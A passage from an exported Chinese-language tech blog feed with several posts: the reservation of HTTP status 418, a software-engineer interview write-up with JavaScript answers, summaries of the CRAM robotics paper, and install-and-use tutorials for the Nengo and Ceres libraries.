So, I poked a couple of implementations to see if they’d remove 418’s “teapot” semantics, and there was a reaction (to put it mildly).


I think we need to reserve 418 to make it clear it can’t be used for the foreseeable future

（來源：http-wg 的 mailing list: Reserving 418
）
於是起草了一份文件：Reserving the 418 HTTP Status Code，裡面說明要把 418 的狀態設定為保留，不能被其他人註冊走：

[RFC2324] was an April 1 RFC that lampooned the various ways HTTP was abused; one such abuse was the definition of the application-specific 418 (I’m a Teapot) status code.


In the intervening years, this status code has been widely implemented as an “easter egg”, and therefore is effectively consumed by this use.


This document changes 418 to the status of “Reserved” in the IANA HTTP Status Code registry to reflect that.

當初研究這整件事情到這裡時，看到這份草稿的資訊發現已經過期了（Expires: February 12, 2018），到 IANA HTTP Status Code registry 看，發現 418 一樣是 Unassigned。
線索就到這邊全部斷掉了，所以 418 最後到底怎麼樣了？會變成保留中嗎？
於是我寫了封信去問 Mark Nottingham 本人，他只丟給我一個連結：https://github.com/httpwg/http-core/issues/43。
從這個 Issue 可以找到這個 PR：Reserve 418 status code，裡面更動了draft-ietf-httpbis-semantics-latest.xml這個檔案。而在 httpwg 的網站上也可以找到現在最新的草稿：https://httpwg.org/http-core/draft-ietf-httpbis-semantics-latest.html。
在最新的草稿裡面，多了這段：

9.5.19. 418 (Unused)
[RFC2324] was an April 1 RFC that lampooned the various ways HTTP was abused; one such abuse was the definition of an application-specific 418 status code. In the intervening years, this status code has been widely implemented as an “Easter Egg”, and therefore is effectively consumed by this use.


Therefore, the 418 status code is reserved in the IANA HTTP Status Code registry. This indicates that the status code cannot be assigned to other applications currently. If future circumstances require its use (e.g., exhaustion of 4NN status codes), it can be re-assigned to another use.

看起來是把 418 先保留起來，但如果日後 4XX 的狀態碼真的用完，還是可以把 418 拿去做其他的用途。
而 httpwg 的網站上也能找到目前最新的 HTTP&#x2F;1.1 的標準：Hypertext Transfer Protocol (HTTP&#x2F;1.1): Semantics and Content，裡面是沒有 418 的。
因此我自己的猜測是在最新的草稿裡面已經把 418 放進去了並且設成保留，但是還沒有正式發表（背後應該還有一堆流程，這部分要去研究 HTTP Working Group 的規章才能知道），不過在日後應該可以看見草稿發布並成為正式的標準。
總結這樣看下來，418 I am a teapot 依舊不會是 HTTP 的標準。畢竟應該有些人跟我想的一樣，只要把 418 I am a teapot 變成 HTTP 標準的一部分，問題就解決了，但最後沒有這樣做我猜是會碰到一些問題（至於是什麼問題我也不知道，有人知道的話麻煩提點，感謝）。
最後的結論應該是 418 這個狀態碼依然會繼續以 I am a teapot 存在於各個主流的 HTTP 實作裡面，但依舊不是 HTTP 標準的一部分。在標準裡面 418 狀態碼是被設定為 (Unused) 而且暫時被保留著，不會被其他用途給取代。
這篇的目的主要就是想記錄一下 418 狀態碼的過去以及現在，並且讓大家知道它並不是 HTTP 標準的一部分。除此之外，在研究的過程中也聯想到了許多開發上會碰到的問題，其實背後的核心概念都是差不多的。
其實在寫這篇的時候猶豫了許久，因為很怕自己有地方會寫錯（參考資料太多太豐富），不過想起了之前忘記在哪看到的一句話：「比起提問，有個更快能得到正確答案的方法。那就是講一個錯的答案，就會有人來糾正你了」。
延伸閱讀：

HN 的討論
HN 的討論 - 2 

關於作者：@huli 野生工程師，相信分享與交流能讓世界變得更美好
]]></content>
      <tags>
        <tag>HTTP</tag>
      </tags>
  </entry>
  <entry>
    <title>記一次軟體工程師面試心得</title>
    <url>/2017/01/27/interview-review/</url>
    <content><![CDATA[前言我自己很喜歡看一些面試的文章，因為可以從裡面學到許多，如果有面試題目的話那就更棒了，可以邊看邊想，測測看自己的實力。這篇文章是我前一陣子面試某間公司的歷程跟一些心得，希望對大家會有幫助。順帶一提，最後是有拿到 offer 的。
我面試的職缺叫做 Software Engineer，軟體工程師，四次面試都是中文的（我原本以為會有英文）。HR 有先跟我聊過，我有說我比較想要做前端，所以有些面試的考題會比較偏前端。但因為這間公司也很注重 CS 的基礎，所以依然會有很多資工本科的問題。（作業系統、資料庫、資料結構與演算法等等）
因為公司不在台灣，所以面試的形式都是採用 Skype 視訊加上某個線上 coding 的網站。現在很多公司的遠端面試都很喜歡採用這種形式，就是出題目給你讓你即時 coding，面試官那邊看得到你打字（就跟 hackpad 或是 Google docs 一樣），也可以直接 compile 看看答案對不對。
一面一面的面試官是個前端工程師，所以問題會比較偏前端。程式語言的部分我是選擇用 JavaScript 來作答。
第一題在 Facebook 上面，對於按讚這個功能，通常會有以下幾種描述：

只有一個人按讚：A likes this
有兩個人按讚：A and B like this
有三個人按讚：A, B and C like this
有四個人以上按讚：A, B and 2 others like this

寫一個 function，會給你一個叫做 names 的陣列，根據 names 輸出結果。
這一題很基本，我覺得主要是想看你會怎麼解決這個問題，以及讓你小試身手一下（怕你太緊張）。我自己的話是直接寫 if…else 去判斷。
另外，記得把一些 edge case 也考慮一下，例如說 names 有可能是空陣列嗎？如果是的話應該輸出什麼？
function like(names) &#123;    var output = &quot; likes this&quot;;    if(names.length&lt;=0) return &quot;&quot;;    if(names.length===1) &#123;        return names[0] + output;    &#125;        output = &quot; like this&quot;;    if(names.length==2) &#123;        return names[0] + &quot; and &quot; + names[1] + output;    &#125;    if(names.length==3) &#123;        return names[0] + &quot;, &quot; + names[1] + &quot; and &quot; + names[2] + output;    &#125;    return names[0] + &quot;, &quot; + names[1] + &quot; and &quot; + names.length-2 + &quot; others&quot; + output;&#125;

第二題幫 array 加一個 any 的 function，可以輸入任一 function，如果任何一個元素丟進那 function 裡面的值是 true，就輸出 true，否則就 false。
例如說現在有個 function 叫做：isGreaterThanZero，範例就會是這樣：
[1, 2, 3, 4, 5].any(isGreaterThanZero); //=&gt; true[-1, 0].any(isGreaterThanZero); //=&gt; false

這題應該主要是考會不會用 Array.prototype 來新增函式上去，如果會的話，實作的部分則沒有什麼難度。一樣附上我的解答：
Array.prototype.any = function(func)&#123;    var len = this.length;    for(var i=0; i&lt;len; i++) &#123;      if(func(this[i])) return true;    &#125;    return false;&#125;


第三題對於這一行程式碼：var MyObject = new MyClass();可以試著講講看背後做了什麼事嗎？有沒有可能不用 new 但是卻達成一樣的效果？
這一題我答的頗差的，主要是考對 JavaScript prototype 機制的理解程度，想瞭解更多的可以參考：JavaScript 語言核心（15）函式 prototype 特性。
第四題有些很慢的 function，我們想把它 cache 起來，下次執行時就不會那麼慢，例如說：
complexFunction(&#x27;a&#x27;, &#x27;b&#x27;); //=&gt; 10scomplexFunction(&#x27;a&#x27;, &#x27;b&#x27;); //=&gt; 10svar ccf = cache(complexFunction);ccf(&#x27;a&#x27;, &#x27;b&#x27;); //=&gt; 10sccf(&#x27;a&#x27;, &#x27;b&#x27;); // Instant
寫出一個 cache 的 function，可以把傳進來的 function 加上 cache 功能
這一題其實考的點滿多的，第一個是考你會不會回傳一個 function（雖然這也滿基本的啦），第二個是考你知不知道怎麼做 deep equal。
因為他範例給的是兩個字串，所以乍看之下好像不是很難，但再追問下去，就會知道應該要寫出一個能夠 cache 所有參數的版本，意思就是如果參數是 Object 的話也應該能做 cache。所以就要紀錄參數跟輸出的組合，去查一下有沒有已經算過的參數，有的話就直接輸出結果。
這題我覺得要做到完美的話其實也挺難的，可以再優化的點應該很多。
我最後完成的不完美的版本：
function cache(func) &#123;    var cached = [];        function deepEqual(obj1, obj2) &#123;        var obj1Type = typeof obj1;        var obj2Type = typeof obj2;        if(obj1Type !== obj2Type) &#123;          return false;        &#125;                // same type        if(obj1Type!==&#x27;object&#x27;) &#123;          return obj1===obj2;        &#125;                // object        for(var key in obj1)&#123;            if(!obj2[key])&#123;              return false;            &#125;            // have the same key            if(!deepEqual(obj1[key], obj2[key]))&#123;                return false;            &#125;        &#125;        return true;    &#125;        return function()&#123;        var isCached = false;        var cacheResult = null;                for(var i=0; i&lt;cached.length; i++)&#123;            if( deepEqual(cached[i].arguments, arguments) ) &#123;                isCached = true;                cacheResult = cached[i].result;                break;            &#125;        &#125;                if(isCached) &#123;            return cacheResult;        &#125; else &#123;            var result = func.apply(null, arguments);            cached.push(&#123;              arguments: arguments,              result: result              &#125;)            return result;        &#125;    &#125;&#125;

第五題用 CSS 實現一個很簡單的網格系統，假設一行有 12 格好了，請問像是col-4這種 class 的 CSS 應該怎麼寫？
因為我 CSS 原本就比較弱，所以還滿怕碰到 CSS 問題，也沒有自己實作過網格系統。所以這一題我就答說：display: inline-block; width: 25%。
後來就被提示說，概念差不多，可是實作上會碰到一些問題，因為預設會有 margin，所以四個雖然看起來會排滿，但其實會排成兩行。要再加上一些修正才行。
一面差不多就到這邊結束了，問的都是一些基本的 JavaScript 跟 CSS 的題目，我覺得沒有特別困難的。所以我自己覺得一面的表現算是還不錯啦。
二面考的問題都是一些比較偏資工本科系的問題了，問題大致如下：

tcp 連線時有三次握手，那關閉時候的流程是什麼（考你四次揮手的流程）
有寫過 linux 上的程式嗎（應該是考你有沒有寫過系統程式）
thread 跟 process 的差別（經典考題）
mysql 的 index 有哪些，差在哪？（考對資料庫的熟悉程度）
hashmap 怎麼實現（考資料結構）
virtual memory 在幹嘛（考作業系統）
資料庫欄位 TEXT 跟 VARCHAR 差異（考資料庫）

可以看到考題還滿廣的，網路、系統程式、作業系統、資料庫、資料結構全部都有問到。這邊是我的弱項，所以都答得滿差的…
三面原本以為二面完就掰掰了，但我自己猜測因為我一面的表現還不錯，綜合起來還是進到了第三面。結果第三面考的依舊是我不太在行的部分。
第三面我有印象的題目只有一題而已，考完之後上網查了一下發現也是滿經典的題目。
假設現在有很多 url 的資料，每筆一行，請找出重複次數最多的前 k 個，並講一下時間複雜度是多少？
其實就是一個純粹考資料結構加演算法的題目，看你要用哪些組合來處理這個問題。但光是知道還不夠，也要能夠把時間複雜度一併講出來才行。我記得我最後給出的解法應該是維護一個有 k 個元素的陣列，然後用 map 來存 url 的出現次數，邊讀資料邊更新出現次數，然後也更新那 k 個元素的陣列，找到最後就是答案了。但這個解法我的時間複雜度也沒有回答得很好，有些地方不太清楚時間複雜度是多少。
對這類型的題目有興趣的話，可參考：十道海量数据处理面试题与十个方法大总结。
四面最後一面依舊是問了很多技術，這一輪面試被問的問題最多，而且也有針對我以前做過的東西去問。我覺得廣度跟深度都有顧及到。
第一題先小試身手，寫一個 reverse 的 function，反轉字串
function reverse(s) &#123;    var output = &quot;&quot;;    var len = s.length;    for(var i=len-1; i&gt;=0; i--)&#123;        output+=s[i];    &#125;    return output;&#125;

第二題寫一個 function：
var main = [1,2,3,4,5,6];var sub = [3,5];removeSubArray(main, sub) -&gt; [1,2,4,6]

這一題比較特別的點是要直接改變傳進來的 array 而不是 return 新的
function removeSubArray(main, sub) &#123;   for(var i=0; i&lt;main.length; i++)&#123;       var temp = sub.indexOf(main[i]);              //remove       if(temp&gt;=0) &#123;           sub.splice(temp, 1);           main.splice(i, 1);           i--;       &#125;   &#125;&#125;

第三題寫一個 copy 的 function，複製傳進來的 object
這一題雖然看似簡單但其實陷阱很多，例如說：如果碰到循環引用的 case 怎麼辦？例如說
var a = &#123;  test: &#123;  &#125;&#125;;a.test = a;

有些 library 提供的 deep clone 函式，碰到這個 case 一樣也會掛掉。但在面試的時候這個 case 我依舊解不掉，需要再花點時間想想。
第四題寫一個 closure（什麼樣子的都可以）  
這一題還滿簡單的啦，只要你知道什麼是 closure 應該都寫得出來。
var increment = function()&#123; var times = 0; return function()&#123;    return ++times; &#125;&#125;

第五題問我之前做過的 Android 熱更新怎麼做的，問很多技術細節。
第六題問我之前做的搶紅包活動是怎麼設計的？這邊的實作在我之前寫過的文章：資料庫的好夥伴：Redis裡面有提到過。
那個活動的需求是：

中午 12 點開放使用者進入網站，並且回答一題問題
回答完後會看到自己的排名（依答題時間排序），照名次獲得獎品
只有前 300 名有獎品，之後都沒有

評估過後我決定引入 Redis 來減輕資料庫的負擔。面試官問的問題是：有沒有辦法寫成：300 名以後連答題頁面都看不到，直接擋在外面。這邊我想很久之後還是沒有想到一個比較好的解法，就只想到把 Database lock 起來，但這樣又會造成很多性能的損耗。最後我有問面試官這題應該怎麼解，他說他也還沒有想法，只是問問看有沒有可能而已XD
第七題講一下 session 跟 cookie 的差別，還有 session 存在哪裡、如果有兩台機器怎麼管理 session？  
剛好這一塊我之前有弄懂過，所以回答的還滿完整的。在之前公司也有碰過兩台機器要共用 session 的情況，我先給了他一個 AWS EC2 上面的 sticky session 的解法，他不太滿意。再來給了用 Redis 統一儲存 cache 再搭配 Redis Replication 來做 HA 的解法，他就很滿意的說：「嗯，這樣可以」
第八題問資料庫的index的概念，為什麼要有 index？index 應該怎麼建？
因為資料庫跟後端那邊我沒有很熟，所以這題也是回答得亂七八糟的。
結論其實這樣四次面試下來，每一次都問技術也是還滿累的，但每次面試也都是可以檢驗自己技術能力的好時刻。你會越面試越知道自己哪一個部分不足，例如說我就是對於資工本科系的那些必修比較不熟，所以之後就應該往這個方向加強。
還有，很多時候我都喜歡自己默默思考，思考出一個自己覺得可行的解法以後才跟面試官講。可是我後來發現這樣做不太好，因為你不說話，他也不說話，整個面試過程就會有很多空白，兩個都不講話。所以可以的話，應該要邊想邊講話我認為是比較好的。例如說：「我剛剛提出的解法是 O(n^2)，我現在在想說有沒有可能把複雜度壓到 O(n log n)，我目前的方向大概是朝…去思考」
儘管最後沒有答出來，有把想法講出來，總比只給一句：「我不知道」來得好。
面試的時候，其實我也都是抱著一種學習的心態。因為知道自己的實力真的不強，所以也希望能從面試官那邊得到一些建議。很多題目我在答不出來之後都會問他們說能不能提供一些方向，因為我真的很想知道答案（不過有些不一定會給就是了）。
大致上就是這樣囉，希望這篇心得對大家之後的面試有幫助。
關於作者：@huli 野生工程師，相信分享與交流能讓世界變得更美好
]]></content>
      <tags>
        <tag>frontend</tag>
        <tag>interview</tag>
        <tag>job</tag>
        <tag>resume</tag>
      </tags>
  </entry>
  <entry>
    <title>一起來讀 CRAM - A Cognitive Robot Abstract Machine for Everyday Manipulation in Human Environments</title>
    <url>/2018/06/09/intro-to-CRAM/</url>
    <content><![CDATA[前言很久以前，我就寫過一篇 CRAM 簡介，但是一直沒有把這個工具用起來，深感可惜。
最近又因緣際會寫了 一起讀 Knowledge-Enabled Robotic Agents for Shelf Replenishment in Cluttered Retail Environments，所以想要再把 CRAM 的原始 paper 拿起來看一次，然後將我所了解的分享給大家。
為什麼發展 CRAM？CRAM 被發展出來的原因，就是因為機器人在做日常生活中會出現的 manipulation task 時，需要做大量的決策。舉例來說，機器人若要從桌上拿起一本書，他就要決定：

要站在哪邊才拿得到書？
要用哪隻手？
手臂要怎麼靠近書？
要怎麼抓？（是說之前弄了一個 awesome-grasping，陸續會再整理有用的東西進去，對這塊有研究的讀者也可以一起來編修）
要出多少力氣來抓？
要怎麼把書拿起來？
要怎麼拿穩？

稀鬆平常到不能再平常的一件任務，仔細去觀察，居然可以包含這麼多的決策，而且每一個都有夠複雜，都可以做很多研究。所以，讓機器人在做事時得以 依照眼前狀況進行決策，CRAM 就是為此而生。
怎麼用 CRAM 來制定計畫？首先，我們來看看，若要讓機器人拿起 ?obj 這個物體，讓 CRAM 執行的 plan 會長得如下：
(def-goal (achieve (object-in-hand ?obj))(with-designators(pickup-place ...)(grasp-type ...)(pickup-reaching-traj ...)(lift-trajectory ...)(when (and (holds-bel (object-in-hand ?curr-obj) now)(obj-equal ?curr-obj ?obj))(succeed (object-in-hand ?obj)))(at-location pickup-place(achieve (arm-at pickup-reaching-traj))(achieve (grasped grasp-type))(achieve (arm-at lift-trajectory))(succeed (object-in-hand ?obj))

特色一 - 用 state 當作目標在這個範例中，我們希望機器人達到的目標是 (object-in-hand ?obj)，這種做法比起直接把目標定成 (pick-up ?obj) 有一些好處。例如，機器人在接收到目標時，他會先檢查手裡面是不是已經有 ?obj 了，而不是不管三七二十一就直接去想辦法抓起來；此外，如果抓取 ?obj 失敗了，機器人也可以發現並沒有達到 (object-in-hand ?obj)，而不會自以為已經執行完 (pick-up ?obj) 就表示任務已經完成。
當然，我們可以很人工地在 pick-up 這個 action 中加上前檢查跟後檢查，但這樣就不是單純的 pick-up 了，以描述的精確度來說，還是 (object-in-hand ?obj) 較好。
特色二 - 用 first-class object 表示 trajectory、object、locationfirst-class object 是 paper 裡的原話，其實簡單理解就是 object 啦！舉例來說，在我們計劃中的 pickup-reaching-traj 可以先初始化成下面的樣子（初始化成這些 attribute 不是憑研究者自己的經驗而來，而是會去 query KnowRob 來得到，至於 KnowRob 怎麼得到，那就要去看 KnowRob 的 paper）：
(a hand-trajectory(purpose (pick-up ?obj))(type motion-plan)(objective (minimize torque)))

這個 object 裡面有幾個 attribute（就像是 object 的 data member），我們可以用這些 attribute 來更清楚描述 pickup-reaching-traj，在這邊就是指定 purpose 是要拿起物體、objective 是要最小化使用的 torque。
厲害的地方來了，在機器人執行任務的過程中，如果機器人看到 ?obj 是杯子，而且裡面有水，那他就可以跟自己說，矮額，我水杯要拿好拿正，才不會被主人罵。所以他就可以加上一個 constraint - (motion-constraint keep-obj-upright)，使 pickup-reaching-traj 變成：
(a hand-trajectory(purpose (pick-up ?obj))(type motion-plan)(objective (minimize torque)))(motion-constraint keep-obj-upright)

這種設計讓機器人要完成的動作、看到的物品、所處的地方都能被表示成 first-class object，在實質意義上就是讓機器人對他所在的 location、要操作的 object 跟要執行的 trajectory 都有 更深的認識，因為這每一個 first-class object 都可以有許許多多的 attribute（例如 location 還可以加上 (memory where-I-and-EVE-first-met)，有看過瓦力的讀者朋友應該懂 XD）。
如果大家跟我一樣，看到這邊應該會有點霧煞煞，講起來好像很厲害，但是要怎麼做到呢？例如機器人看到有水的杯子，怎麼知道要加上 (motion-constraint keep-obj-upright)，這究竟怎麼實作的？
所以接下來，我們來看看 CRAM 的架構。
CRAM 的架構蹦！一開始先上架構圖，不過一開始不容易看懂，沒關係，讓我們繼續看下去。

重點一 - CPL（CRAM Plan Language）CRAM 的可執行計畫，就是用 CPL 寫的。CPL 是這篇論文的研究者們自己發展出來的一套 plan language，他們說當時存在的一些方法（例如 3T architecture），對於 Concurrency、action synchronization、failure handling、loops 跟 reactiveness 的支援都不到位，但這些功能都是機器人應用必須考慮的。
以我目前的程度，要討論 plan language 的設計還太早，所以就讓我們直接來看看 CPL 可以怎麼用吧：

這個 table 裡面列了一些 CPL 的 control structure，前兩個應該滿簡單就可以理解。__in parallel do__ 就是讓機器人可以同時 navigate 跟建地圖；__try in parallel__ 就是讓機器人同時用兩種方法去嘗試完成某個任務。
with constraining plan p b 的意思就是，執行 primary activity B 並且讓執行過程滿足 constraining plan P。
plan 這一類的意思是可以利用 order 來指定各個 subplan 執行的順序。
重點二 - KnowRobKnowRob 的核心是 Prolog 寫的，主要就是可以儲存 knowledge、對這些 knowledge 做簡單推理、還有跟 CPL 相接。
跟 CPL 相接的概念也滿簡單的，是用 query-answer 的方式相接。例如 CPL 可以問 KnowRob 說桌上的杯子在哪裡，或可以問說桌上有沒有杯子。
那為何 KnowRob 可以回答這類問題呢？
詳細可以參考 一起讀 Knowledge-Enabled Robotic Agents for Shelf Replenishment in Cluttered Retail Environments 裡面的 Knowledge 小節。
但是，要回答這麼多種類的問題，僅僅靠一個核心 KnowRob 是不夠的。例如當 CPL 問 KnowRob 桌上有沒有杯子時，KnowRob 必須要有能力辨識物體，並且知道什麼是上下關係。而且，物體辨識的演算法還一直在進步中，所以必須要保有彈性。而 KnowRob 保有彈性的方式也是利用可以跟多個 module 相接的方式，這個對應到架構圖中的KnowRob Extension Modules。
重點三 - COGITOCOGITO 在 CRAM kernel 之上又加了一層推理的功能。核心精神是要可以去檢視 CRAM 制定的 plan 好不好、執行是否遇到失敗、怎麼改進等等。
論文裡面對於詳細運作方式沒有著墨太深，僅僅點到：A plan is not only a piece of compiled code that is executed, but also a data structure that can be accessed during run-time or recorded to create a persistent execution trace.
回顧現在，我們有辦法回答剛剛的問題了嗎？
機器人看到有水的杯子，怎麼知道要加上 (motion-constraint keep-obj-upright)，這究竟怎麼實作的？

雖然論文上沒有明講，但我們稍微推敲一下就會知道，一旦機器人辨識出有水的杯子，一調用 KnowRob 儲存的知識，就可以在這個物體的 attribute 加上 (motion-constraint keep-obj-upright)。然後，如果執行任務時，?obj &#x3D;&#x3D; 剛剛辨識出來的有水杯子，那自然就會把這個 object 裡跟 trajectory 有關的 attribute 加入要執行的 trajectory 條件中。（雖然想起來很簡單，不過沒有接到實作還是覺得虛虛的，之後有機會可以實作看看）
CRAM 的可擴充性從 CRAM 的架構圖中，我們可以看到左邊有一排 CPL Extension Modules，基本上就是要提供更多功能，讓 perception、learning、adaptation 等等都做得更好。舉例時間，我們可以搭配一個 module，讓機器人可以辨識 human action。
這個擴充彈性算是一個先留下來的空缺，看你的應用是什麼，就可以擴充自己想要的 module。有興趣更深入了解的話，可以去看 paper 裡面的 VI. COGNITIVE EXTENSIONS。
總結這次跟大家介紹了 CRAM 這篇論文，也算是智慧機器人領域一大厲害的架構，希望可以幫助更多台灣的讀者朋友一起踏入認知機器人的領域。在 Deep Learning、Reinforcement Learning 開始風起雲湧的這個時代，CRAM 這種較從 rule、logic 著手的方法，跟 machine learning based 的方法應該會激盪出新的火花吧。
延伸閱讀
A Reactive Plan Language
CRAM tutorials

關於作者：

@pojenlai 演算法工程師，對機器人、電腦視覺和人工智慧有少許研究，正在學習用心體會事物的本質跟不斷進入學生心態改進。

]]></content>
      <tags>
        <tag>ROS</tag>
        <tag>CRAM</tag>
        <tag>robotics</tag>
      </tags>
  </entry>
  <entry>
    <title>Nengo AI 入門</title>
    <url>/2019/05/10/intro-nengo/</url>
    <content><![CDATA[前言今天要跟大家介紹一個叫做 Nengo AI 的 Python 函式庫，這個函式庫主要提供的功能就是讓人可以建立分散式的 AI 系統，可以想像成更加龐大、功能也更強大的 AI。大家可以看一下介紹影片：

安裝安裝的步驟滿簡單的，一行 pip install nengo 就搞定。
(C:\Users\rosindigo\Anaconda3\envs) C:\Users\rosindigo\PycharmProjects\nengo&gt;pip install nengoCollecting nengoUsing cached https://files.pythonhosted.org/packages/f7/ce/e314e1176bfbbe6c3b6cf4e8fa0620cafad8f8bad04203c55881e9cb2fb0/nengo-2.8.0-py2.py3-none-any.whlCollecting numpy&gt;=1.8 (from nengo)Downloading https://files.pythonhosted.org/packages/2e/11/f006363050b24fb19a235e5efd219e7ac549398d531110d80b8f2ba3a909/numpy-1.16.3-cp36-cp36m-win_amd64.whl (11.9MB)|████████████████████████████████| 11.9MB 233kB/sInstalling collected packages: numpy, nengoSuccessfully installed nengo-2.8.0 numpy-1.16.3

安裝完成之後，你可以先 import nengo 看看是不是可以成功：
import nengomodel = nengo.Network()

因為 nengo 除了 core 之外，還有不同的 module，如果也想要安裝的話，可以參考下面的 command template：
pip install nengo[optional] # Additional solvers and speedupspip install nengo[docs] # For building docspip install nengo[tests] # For running the test suitepip install nengo[all] # All of the above

簡單理解 Nengo 的架構下面這張圖很清楚地展示了 Nengo 從 Model 層到 Hardware 層的各個 module，基本上你可以說只要用 Nengo，就可以開發出在各種硬體上執行的 AI 系統。

程式範例接下來就讓我們看一個非常簡單的範例小程式（我就直接把說明寫在註解裡面啦）：
import nengoimport numpy as np  if __name__ == &quot;__main__&quot;:  # 創建一個新的 network  # 在 Nengo 中，任何 model 都是被包含在 Network 中  model = nengo.Network()   # 建立一個有 40 個 neuron 的 Nengo object - my_ensemble  # object 是 model 的一部分(你可以建多個 object)  # 用 with model 是為了讓 Nengo 知道這個 object 屬於哪個 model  with model:    my_ensemble = nengo.Ensemble(n_neurons=40, dimensions=1)     # sin_input_node 會輸出一個 sine 波訊號    sin_input_node = nengo.Node(output=np.sin)     # 將 sin_input_node 的輸出送給 my_ensemble    nengo.Connection(sin_input_node, my_ensemble)   # 一旦建立好 object，也指定了裡面的 data 要怎麼流動  # 這時候就可以用 Probe 來指定要收集哪邊的 data  my_probe = nengo.Probe(my_ensemble)   # 要模擬之前，要先用 model 建立一個 Simulator  sim = nengo.Simulator(model)   # 跑模擬，並印出模擬結果  sim.run(5.0)  print(sim.data[my_probe][-10:])

如果想要對 Neural Engineering Framework 有更深入的了解，可以看看這篇介紹 - A Technical Overview of the Neural Engineering Framework。
總結今天跟大家介紹了 Nengo 這個 AI 系統的開發框架，個人覺得這個框架的潛力還滿大的，有興趣的讀者可以參考延伸閱讀提供的更多教材，先學習建立複雜度更高的 model，再進一步做出自己想要的 model。
延伸閱讀
Nengo Documentation
NengoDL: Combining deep learning and neuromorphic modelling methods
Biospaun: a large-scale behaving brain model with complex neurons

關於作者：@pojenlai 演算法工程師，對機器人、電腦視覺和人工智慧有少許研究，正在學習用心體會事物的本質跟不斷進入學生心態改進。
]]></content>
      <tags>
        <tag>Nengo AI</tag>
        <tag>Neural Network</tag>
        <tag>Deep Learning</tag>
      </tags>
  </entry>
  <entry>
    <title>Ceres 函式庫簡介</title>
    <url>/2017/12/31/intro-to-ceres-solver/</url>
    <content><![CDATA[前言Ceres 是用來求解 Optimization 問題的 C++ 開源函式庫，是由 Google 所釋出的，文件相當完整，而且這個函式庫還有不少 好處(例如 code 品質、使用的方便性等等)。
今天我們會一起來看看怎麼安裝 Ceres，並用 Ceres 來求解一個最簡單的問題。
安裝 Ceres (in Linux)一開始呢，要先安裝一些 Ceres 會使用到的函式庫；
sudo apt-get install liblapack-dev libsuitesparse-dev libcxsparse3.1.2 libgflags-dev libgoogle-glog-dev libgtest-dev

接下來，就是安裝 Ceres 了；
git clone https://github.com/ceres-solver/ceres-solver.gitmkdir ceres-bincd ceres-bincmake ../ceres-solvermake -j3make testsudo make install

只要把 78 個 test 都跑過就算是安裝成功囉！
使用 Ceres 來求解一個超簡單的方程式基本上，Ceres 是用來求解下列方程式的 least-squared error 解：

這種方程式在滿多應用中都會碰到，例如 SLAM 求解兩個 keyframe 中的 transform，使 pixel 間的誤差最小。值得注意的是，f() 可以是一個非線性的函數，也就是說你只需要把想求解的函式寫出來，Ceres 就可以幫你解，如果不能 formulate 成線性函數也沒有關係。
那從官網上可以看到一個最最最簡單的例子，求解如下方程式的最小值：

雖然我們一看就知道，答案就是 x&#x3D;10 時可以達到最小值 0，但要怎麼用 Ceres 來解呢？
做法會是要先定義一個 functor，讓求解過程中可以使用這個 functor 來計算當前解的誤差：
struct CostFunctor &#123;   template &lt;typename T&gt;   bool operator()(const T* const x, T* residual) const &#123;     residual[0] = T(10.0) - x[0];     return true;   &#125;&#125;;

有了這個計算 residual 的 functor 後，接下來就是要定義問題跟求解，讓我們直接看 helloworld.cc 的程式碼吧：
#include &quot;ceres/ceres.h&quot;#include &quot;glog/logging.h&quot;  //會使用到的 functionusing ceres::AutoDiffCostFunction;using ceres::CostFunction;using ceres::Problem;using ceres::Solver;using ceres::Solve;  // 第一步要先定義的 functorstruct CostFunctor &#123;  template &lt;typename T&gt; bool operator()(const T* const x, T* residual) const &#123;    residual[0] = 10.0 - x[0];    return true;  &#125;&#125;;  int main(int argc, char** argv) &#123;  google::InitGoogleLogging(argv[0]);    // 設定想要求解的變數初始值  double x = 0.5;  const double initial_x = x;    // 初始化 problem  Problem problem;    // 定義 cost_function，這邊是用到 AutoDiffCostFunction  // AutoDiffCostFunction 會吃上面定義的 functor，然後用 functor 裡寫的方式算誤差  CostFunction* cost_function =      new AutoDiffCostFunction&lt;CostFunctor, 1, 1&gt;(new CostFunctor);  // 定義 problem 要使用我們剛建立的 cost_function  problem.AddResidualBlock(cost_function, NULL, &amp;x);    // Run solver 來解 problem  Solver::Options options;  options.minimizer_progress_to_stdout = true;  Solver::Summary summary;  Solve(options, &amp;problem, &amp;summary);    // 輸出結果  std::cout &lt;&lt; summary.BriefReport() &lt;&lt; &quot;\n&quot;;  std::cout &lt;&lt; &quot;x : &quot; &lt;&lt; initial_x            &lt;&lt; &quot; -&gt; &quot; &lt;&lt; x &lt;&lt; &quot;\n&quot;;  			  return 0;&#125;

所以步驟大概就是:

定義 functor
定義欲求參數的初始值
定義 cost_function 並指定 problem 要使用 cost_function 求解
設定並執行 Solver 求解問題
看結果

假設你剛剛有編譯成功，你可以直接在 ceres-bin\bin 找到 helloworld 的執行檔，執行後的結果如下：
iter      cost      cost_change  |gradient|   |step|    tr_ratio  tr_radius  ls_iter  iter_time  total_time   0  4.512500e+01    0.00e+00    9.50e+00   0.00e+00   0.00e+00  1.00e+04        0    7.54e-05    1.94e-03   1  4.511598e-07    4.51e+01    9.50e-04   9.50e+00   1.00e+00  3.00e+04        1    8.24e-04    3.01e-03   2  5.012552e-16    4.51e-07    3.17e-08   9.50e-04   1.00e+00  9.00e+04        1    5.95e-05    3.16e-03Ceres Solver Report: Iterations: 3, Initial cost: 4.512500e+01, Final cost: 5.012552e-16, Termination: CONVERGENCEx : 0.5 -&gt; 10

其中過了三步他就解出了答案是 x&#x3D;10，收斂的速度算是滿快的。雖然這個問題其實是線性的，可以一步解出，但預設的 solver 是用來解 non-linear optimization 問題，所以會花好幾步。
總結今天我們簡單介紹了 Ceres 這個函式庫，也跑了最簡單的程式來學習怎麼使用 Ceres，之後大家如果有遇到要求解 non-linear optimization 問題，就可以考慮使用 Ceres 來解囉！
延伸閱讀
ceres-solver tutorial

關於作者：@pojenlai 演算法工程師，對機器人跟電腦視覺有少許研究，最近在學習看清事物的本質與改進自己的觀念
]]></content>
      <tags>
        <tag>Ceres</tag>
        <tag>non-linear optimization</tag>
      </tags>
  </entry>
  <entry>
    <title>一起來讀論文 - Robot Learning via Human Adversarial Games</title>
    <url>/2019/04/12/intro-to-human-adversarial-learning/</url>
    <content><![CDATA[前言這次要跟大家介紹一篇論文 - Robot Learning via Human Adversarial Games。這篇論文主要想研究的問題是，在機器人透過 Reinforcement Learning 學習抓東西的過程中，如果有人類來干擾機器人、試圖讓機器人抓到的東西被弄掉，是不是有辦法讓機器人學習得更有效率？

